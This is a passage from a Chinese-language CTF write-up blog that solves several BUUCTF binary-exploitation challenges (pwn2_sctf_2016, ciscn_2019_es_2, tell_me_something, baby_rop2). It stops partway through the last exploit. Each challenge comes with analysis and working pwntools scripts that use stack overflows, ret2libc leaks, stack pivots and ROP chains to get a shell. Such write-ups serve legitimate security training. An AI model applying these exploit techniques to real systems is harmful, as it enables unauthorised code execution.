&#123;</span></span><br><span class="line">    <span class="comment">//     v4 = getchar();</span></span><br><span class="line">    <span class="comment">//     if ( !v4 || v4 == 10 || i &gt;= a2 )</span></span><br><span class="line">    <span class="comment">//       break;</span></span><br><span class="line">    <span class="comment">//     v2 = i;</span></span><br><span class="line">    <span class="comment">//     *(_BYTE *)(v2 + a1) = v4;</span></span><br><span class="line">    <span class="comment">//   &#125;</span></span><br><span class="line">    <span class="comment">//   result = a1 + i;</span></span><br><span class="line">    <span class="comment">//   *(_BYTE *)(a1 + i) = 0;</span></span><br><span class="line">    <span class="comment">//   return result;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">	v2 = atoi(nptr);</span><br><span class="line">	<span class="keyword">if</span> ( v2 &gt; <span class="number">32</span> )</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;No! That size (%d) is too large!\n&quot;</span>, v2);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Ok, sounds good. Give me %u bytes of data!\n&quot;</span>, v2);</span><br><span class="line">	get_n(nptr, v2);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;You said: %s\n&quot;</span>, nptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>栈溢出存在，但是本题文件并不包含危险套装，因此需要 <kbd>ret2libc</kbd>。这里使用 <kbd>printf()</kbd> 函数让其输出自身真实地址，值得注意的是使用 <kbd>printf()</kbd> 输出会导致地址及其后数据一起被输出，所以需要自行截取前四个字节数据。<kbd>LibcSearcher</kbd> 并没有成功找到对应 <kbd>libc</kbd>，因此此处使用 BUU 平台提供的，构造 <kbd>exp</kbd> 如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment"># 开启调试模式，实际解题会有很大帮助</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./pwn2_sctf_2016&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25961</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn2_sctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pnt_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">pnt_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">vuln_addr = <span class="number">0x804852F</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2C</span> + <span class="number">4</span>) + p32(pnt_plt) + p32(vuln_addr) + p32(pnt_got)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line"><span class="comment"># 取回原程序输出部分，后续数据即以 printf 函数地址为首</span></span><br><span class="line">pnt_addr = <span class="built_in">hex</span>(u32(io.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\0&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span>(pnt_addr)</span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment"># 取回剩余无效数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;printf&#x27;,int(pnt_addr,16))</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(pnt_addr,<span class="number">16</span>) - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2C</span> + <span class="number">4</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class="line">io.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><h2 id="ciscn-2019-es-2">ciscn_2019_es_2</h2><ul><li><p>先验文件，本题文件为 <kbd>32</kbd> 位可执行文件，仅开启 NX 保护。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ file ./ciscn_2019_es_2 </span><br><span class="line">./ciscn_2019_es_2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=88938f6e63cc4e27018f9032c4934e0a377712d1, not stripped</span><br><span class="line"></span><br><span class="line">└─$ checksec ./ciscn_2019_es_2 </span><br><span class="line">[*] <span class="string">&#x27;/home/h-t-m/ciscn_2019_es_2&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>本地执行，程序连续两次等待用户输入并随后将数据打印，而且第二次数据貌似是从第一次数据的地址覆盖，若未完全覆盖则会继续输出第一次的后续数据。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./ciscn_2019_es_2</span><br><span class="line">Welcome, my friend. What<span class="string">&#x27;s your name?</span></span><br><span class="line"><span class="string">h-t-m myr520</span></span><br><span class="line"><span class="string">Hello, h-t-m myr520</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hello, </span></span><br><span class="line"><span class="string">-t-m myr520</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">└─$ ./ciscn_2019_es_2</span></span><br><span class="line"><span class="string">Welcome, my friend. What&#x27;</span>s your name?</span><br><span class="line">h-t-m</span><br><span class="line">Hello, h-t-m</span><br><span class="line"></span><br><span class="line">myr520</span><br><span class="line">Hello, myr520</span><br></pre></td></tr></table></figure></li><li><kbd>IDA</kbd> 反编译查看伪代码，主体实现都在 <kbd>vul()</kbd> 函数中，其中第二次输入确实直接覆盖于第一次输入之上。对输入的限制为 <kbd>0x30</kbd> 字节，而变量所在栈偏移为 <kbd>0x28</kbd> 字节，因此存在栈溢出，但不多。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序中存在后门函数，直接调用了 <kbd>system()</kbd> 函数并打印了 <kbd>flag</kbd> 这四个字母。<psw>某人看见后门函数直接栈溢出调用，这题太简单了，结果输出了 flag.</psw></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>因此，本题存在 <kbd>8</kbd> 字节的栈溢出，有 <kbd>system()</kbd> 函数但是不能直接调用，此外程序中不包含字符串 <kbd>/bin/sh</kbd>。影响最大的还是仅仅 <kbd>8</kbd> 字节的栈溢出，在填充了 <kbd>ebp</kbd> 之后就只剩 <kbd>4</kbd> 字节用于跳转，完全无法传参。但是，如果变量 <kbd>s</kbd> 空间内的数据并不是填充用的垃圾数据，而是 <kbd>system()</kbd> 函数的调用及传参的指令，那么在溢出后让 <kbd>eip</kbd> 寄存器跳转回该部分即可达到与直接溢出调用相同的效果。这里先考虑目标地址的问题，栈空间的地址是随机的，所以并不能实现直接指定跳转地址，但是，本题有两次的同一位置输入输出，也就是说可以在第一次获取其栈地址而在第二次完成跳转。由于打印使用的 <kbd>printf()</kbd> 函数在读取到空字符后才会停止，因此若栈帧中旧 <kbd>ebp</kbd> 位之前全部为非空字符，则程序将连同该 <kbd>ebp</kbd> 值一起输出。构造如下 <kbd>exp</kbd> 便可获得旧 <kbd>ebp</kbd> 的地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ciscn_2019_es_2&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25961</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">36</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">ebp_addr = <span class="built_in">hex</span>(u32(io.recv(<span class="number">4</span>)))</span><br><span class="line"><span class="built_in">print</span>(ebp_addr)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure></li><li><p>有了旧的 <kbd>ebp</kbd> 现在只需计算偏移就可锁定指定位置，毕竟栈偏移不会变，因此获取之后直接加入计算即可。本地调试可知，旧 <kbd>ebp</kbd> 距离变量 <kbd>s</kbd> 偏移为 <kbd>0x38</kbd>。</p><img src="0007.webp" alt="" style="zoom:75%"></li><li><p>锁定位置之后就需要让 <kbd>eip</kbd> 寄存器指过去了，我们并不能直接控制该寄存器，但是可以借助一些现有指令让栈帧被改变，而 <kbd>eip</kbd> 也就会跟着在新栈帧中移动。各函数尾的 <kbd>leave</kbd> + <kbd>ret</kbd> 指令便是利用的对象，<kbd>leave</kbd> 相当于如下指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure><p>当前函数调用结束时会先执行 <kbd>leave</kbd> + <kbd>ret</kbd> 指令，而其中 <kbd>leave</kbd> 指令将旧的 <kbd>ebp</kbd> 值放回 <kbd>ebp</kbd> 寄存器中，若随后我们通过栈溢出部分再次跳转到 <kbd>leave</kbd>，则旧的 <kbd>ebp</kbd> 值便被间接存入了 <kbd>esp</kbd> 寄存器中。因为旧的 <kbd>ebp</kbd> 值我们可以控制，所以借助该指令我们便可完成栈顶的指定。不过由于新栈顶完成之后还有 <kbd>pop ebp</kbd> 指令，因此新栈帧最初四个字节数据应保留用于抵消该操作。</p></li><li><p>最后在变量 <kbd>s</kbd> 空间内写入跳转调用栈数据，字符串 <kbd>/bin/sh</kbd> 直接在栈中传递即可，地址可以由 <kbd>payload</kbd> 计算出来。构造 <kbd>exp</kbd> 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26703</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./ciscn_2019_es_2&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">36</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span></span><br><span class="line"><span class="comment"># 标志结尾，便于识别</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># 不使用 sendline() 以免其自带的换行符干扰</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">ebp_addr = <span class="built_in">hex</span>(u32(io.recv(<span class="number">4</span>)))</span><br><span class="line"><span class="comment"># print(ebp_addr)</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x80484b8</span></span><br><span class="line">sys_addr = <span class="number">0x8048400</span></span><br><span class="line"></span><br><span class="line">payload2 = p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="built_in">int</span>(ebp_addr,<span class="number">16</span>) - <span class="number">0x38</span> + <span class="number">0x10</span>) + <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"><span class="comment"># 避免自行计数，直接使用空字符将变量空间填充满，便于后续栈溢出</span></span><br><span class="line">payload2 += p32(<span class="built_in">int</span>(ebp_addr,<span class="number">16</span>) - <span class="number">0x38</span>) + p32(leave_ret)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><h2 id="jarvisoj-tell-me-something">jarvisoj_tell_me_something</h2><ul><li><p>先验文件，本题文件为 <kbd>64</kbd> 位可执行文件，只开了 NX 保护，但是以往半开的 RELRO 被完全关闭了，意味着本题的一些重定位信息可以被修改。很遗憾本题没有利用这一点。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ file ./guestbook              </span><br><span class="line">./guestbook: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=7429502fc855237f3f8eeceb262ddcf6b2c2854e, not stripped</span><br><span class="line"></span><br><span class="line">└─$ checksec ./guestbook              </span><br><span class="line">[*] <span class="string">&#x27;/home/h-t-m/guestbook&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>本地执行一遍，程序等待用户输入完成之后便打印一串静态字符串退出了。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./guestbook              </span><br><span class="line">Input your message:</span><br><span class="line">h-t-m myr520</span><br><span class="line">I have received your message, Thank you!</span><br></pre></td></tr></table></figure></li><li><kbd>IDA</kbd> 反编译查看伪代码，主函数基本就是本地测试时的全部内容。其中 <kbd>read()</kbd> 函数读取字符限制数为 <kbd>0x100</kbd> 多于局部变量距离栈底偏移 <kbd>0x88</kbd>，足以进行栈溢出利用。值得注意的是本题没有 <kbd>ebp</kbd> 相关的操作，因此栈溢出时不需考虑 <kbd>ebp</kbd> 位。如下为主函数的汇编代码：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sub     rsp, 88h</span><br><span class="line">mov     edx, 14h        ; n</span><br><span class="line">mov     esi, offset aInputYourMessa ; &quot;Input your message:\n&quot;</span><br><span class="line">mov     edi, 1          ; fd</span><br><span class="line">call    _write</span><br><span class="line">mov     rsi, rsp        ; buf</span><br><span class="line">mov     edx, 100h       ; nbytes</span><br><span class="line">xor     edi, edi        ; fd</span><br><span class="line">call    _read</span><br><span class="line">mov     edx, 29h ; &#x27;)&#x27;  ; n</span><br><span class="line">mov     esi, offset aIHaveReceivedY ; &quot;I have received your message, Thank you&quot;...</span><br><span class="line">mov     edi, 1          ; fd</span><br><span class="line">call    _write</span><br><span class="line">add     rsp, 88h</span><br><span class="line">retn</span><br></pre></td></tr></table></figure></li><li><kbd>Shift</kbd> + <kbd>F12</kbd> 发现程序中含有关键字符 <kbd>flag.txt</kbd> 并且其在 <kbd>good_game()</kbd> 函数中被调用，该函数打开并逐个输出了文件内容。可以判断只要调用这个函数就可以获取 <kbd>flag</kbd>。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">good_game</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">9</span>]; <span class="comment">// [rsp+Fh] [rbp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = fgetc(v0);</span><br><span class="line">    buf[<span class="number">0</span>] = result;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">0xFF</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="number">1uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>栈溢出和 <kbd>flag</kbd> 读取函数都是现成的，直接构造 <kbd>exp</kbd> 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27417</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./guestbook&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x88</span> + p64(<span class="number">0x0400620</span>)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line"><span class="comment"># 便于读取，先取掉无用的那一行</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"><span class="comment"># 运行太快可能造成 flag 未完全输出就被返回，可手动调用 sleep() 等待</span></span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br></pre></td></tr></table></figure></li></ul><h2 id="HarekazeCTF2019-baby-rop2">[HarekazeCTF2019]baby_rop2</h2><ul><li><p>先验文件，本题文件为 <kbd>64</kbd> 位的可执行文件，依然只开启了 NX 保护。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ file ./babyrop2              </span><br><span class="line">./babyrop2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=fab931b976ae2ff40aa1f5d1926518a0a31a8fd7, not stripped</span><br><span class="line"></span><br><span class="line">└─$ checksec ./babyrop2              </span><br><span class="line">[*] <span class="string">&#x27;/home/h-t-m/babyrop2&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>本地执行一遍，程序请求输入姓名，随后在问候中打印姓名并退出。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./babyrop2</span><br><span class="line">What<span class="string">&#x27;s your name? h-t-m myr520</span></span><br><span class="line"><span class="string">Welcome to the Pwn World again, h-t-m myr520!</span></span><br></pre></td></tr></table></figure></li><li><kbd>IDA</kbd> 反编译查看伪代码，主函数中使用 <kbd>read()</kbd> 函数读取用户输入，限制远大于栈偏移，因此存在栈溢出。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">28</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s your name? &quot;</span>);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the Pwn World again, %s!\n&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>程序中并未找到危险套装，因此本题还是使用 <kbd>ret2libc</kbd>。题目中给出了 <kbd>libc</kbd> 文件，因此直接从文件中读取数据。<kbd>查库很可能找不到，就不尝试了。</kbd> 这里使用 <kbd>printf()</kbd> 函数来泄露 <kbd>read()</kbd> 函数的真实地址，实测不能使用 <kbd>printf()</kbd> 的地址拿来泄露，<psw>貌似 libc 并不完全对应</psw>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29566</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./babyrop2&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pnt_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">rdi_ret = <span class="number">0x400733</span></span><br><span class="line">main_addr = <span class="number">0x400636</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_ret) + p64(read_got) + p64(pnt_plt) + p64(main_addr)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">pnt_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="comment"># 虽然地址有八位，但是有效值仅占六位，因此只能读取六位</span></span><br><span class="line"><span class="comment"># print(hex(pnt_addr))</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">base = pnt_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sys_addr = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_ret) + p64(bin_sh) + 